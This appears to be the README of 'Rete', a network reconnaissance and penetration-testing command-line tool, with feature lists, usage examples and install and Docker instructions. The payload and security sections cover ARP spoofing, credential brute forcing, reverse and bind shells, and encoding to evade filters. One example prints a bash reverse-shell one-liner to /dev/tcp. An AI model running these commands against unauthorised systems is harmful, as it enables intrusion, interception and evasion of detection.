## Features:

- **Reconnaissance & Discovery**
  - Ping sweeps
  - TCP/UDP port scanning
  - OS fingerprinting
  - Service version enumeration
  - DNS lookup
  - WHOIS lookup
  - Subdomain enumeration

- **Network Diagnostics**
  - Traceroute
  - Bandwidth measurement
  - Latency monitoring
  - Packet loss checks
  - MTU discovery
  - ARP scanning

- **Security & Penetration Testing**
  - Packet sniffing
  - Custom packet forging
  - ARP spoofing
  - Vulnerability scanning
  - Credential brute forcing
  - SSL/TLS auditing

- **Payload Delivery**
  - Reverse shell payload generation
  - File transfer helpers
  - Bind shell setup
  - Payload encoding

- **Feature Catalog Management**
  - Browse available features
  - Seed features from CSV

- **Job Tracking**
  - Record CLI actions as jobs
  - Track jobs in the TUI dashboard

- **Interactive TUI**
  - Launches a terminal UI when run without subcommands.

## Core CLI capabilities

Rete is organized into focused command groups:

 - rete recon — reconnaissance and discovery
 - rete diag — network diagnostics
 - rete sec — security and penetration testing
 - rete payload — payload delivery helpers
 - rete features — feature catalog browsing and seeding
 - rete jobs — job tracking and status management

### recon

 - rete recon ping-sweep — discover live hosts with ICMP echo requests
 - rete recon port-scan — scan TCP or UDP ports on a target host
 - rete recon os-finger — identify the remote host operating system
 - rete recon service-enum — detect running services and versions
 - rete recon dns — perform forward and reverse DNS resolution
 - rete recon whois — query WHOIS data for a domain or IP address
 - rete recon subdomain — enumerate subdomains via DNS brute force

Examples:
 - rete recon ping-sweep --target 192.168.1.0/24
 - rete recon port-scan --target 10.0.0.1 --ports 1-1024 --proto tcp
 - rete recon dns --target example.com

### diag

 - rete diag traceroute — trace the path packets take to a destination
 - rete diag bandwidth — measure available bandwidth to a host
 - rete diag latency — monitor round-trip latency over time
 - rete diag packet-loss — measure packet loss percentage
 - rete diag mtu — discover the maximum transmission unit on a path
 - rete diag arp-scan — discover local network hosts via ARP

Examples:
 - rete diag traceroute --target 8.8.8.8 --max-hops 30
 - rete diag latency --target 8.8.8.8 --count 10 --interval 1
 - rete diag arp-scan --iface eth0

### sec

 - rete sec sniff — capture and inspect packets on a network interface
 - rete sec forge — craft and inject custom network packets
 - rete sec arp-spoof — poison ARP caches for MITM interception
 - rete sec vuln-scan — scan for common vulnerabilities on a target
 - rete sec brute — attempt credential brute force against a service
 - rete sec tls-audit — audit SSL/TLS configuration on a remote host

 Examples:
 - rete sec sniff --iface eth0 --filter 'tcp port 80' --count 50
 - rete sec vuln-scan --target 10.0.0.1 --ports 22,80,443
 - rete sec tls-audit --target example.com:443

### payload

 - rete payload rev-shell — generate reverse shell payload templates
 - rete payload file-xfer — transfer files over TCP or HTTP channels
 - rete payload bind-shell — set up a bind shell listener on a port
 - rete payload encode — encode a payload to evade simple pattern filters

Examples:
 - rete payload rev-shell --lhost 10.0.0.1 --lport 4444 --lang bash
 - rete payload file-xfer --target 10.0.0.2 --file ./artifact.bin --mode http --port 8080
 - rete payload encode --input 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' --encoder base64

### features

 - rete features list — list available features
 - rete features list — list available features
 - rete features seed — import a custom feature catalog from a CSV file (admin use)

 Examples:
 - rete features list
 - rete features list --category 'Reconnaissance & Discovery'
 - rete features seed --file custom.csv

### jobs

- rete jobs list — list recent scan jobs
- rete jobs show [job-id] — show details for a specific scan job

Examples:

 - rete jobs list
 - rete jobs list --limit 50
 - rete jobs show 7

### Interactive TUI

 - Running rete with no subcommand launches the terminal UI dashboard.

## Install:

Download the appropriate binary for your platform below and make it executable:

Linux:
```
chmod +x rete-linux-amd64
```
```
sudo mv rete-linux-amd64 /usr/local/bin/rete
```
 or
```
chmod +x rete-linux-arm64
```
```
sudo mv rete-linux-arm64 /usr/local/bin/rete
```
macOS:
```
chmod +x rete-macos-arm64
```
```
sudo mv rete-macos-arm64 /usr/local/bin/rete
```
  or
```
chmod +x rete-macos-amd64
```
```
sudo mv rete-macos-amd64 /usr/local/bin/rete
```
Windows:
```
Download rete-windows-amd64.exe and add it to your PATH as rete.
```

## Docker

Build the image:
```bash
docker build -t rete .
```

Run the default interactive TUI:
```bash
docker run -it --rm \
  -v rete-data:/app/data \
  -e RETE_DB_PATH=/app/data/rete.db \
  rete
```
Run a specific command, for example feature listing:
```bash
docker run -it --rm \
  -v rete-data:/app/data \
  -e RETE_DB_PATH=/app/data/rete.db \
  rete features list
```
Run a network scan example:
```bash
docker run -it --rm \
  --cap-add=NET_RAW \
  --network host \
  -v rete-data:/app/data \
  -e RETE_DB_PATH=/app/data/rete.db \
  rete recon ping-sweep --target 192.168.1.0/24
```
Note:
 - The container uses RETE_DB_PATH=/app/data/rete.db by default.
 - Database state is persisted in /app/data.
 - Some reconnaissance and security features may require elevated network permissions such as --network host and --cap-add=NET_RAW.
 - If a command needs direct access to the local network interface, you may also need to pass additional Linux capabilities depending on the feature being used.


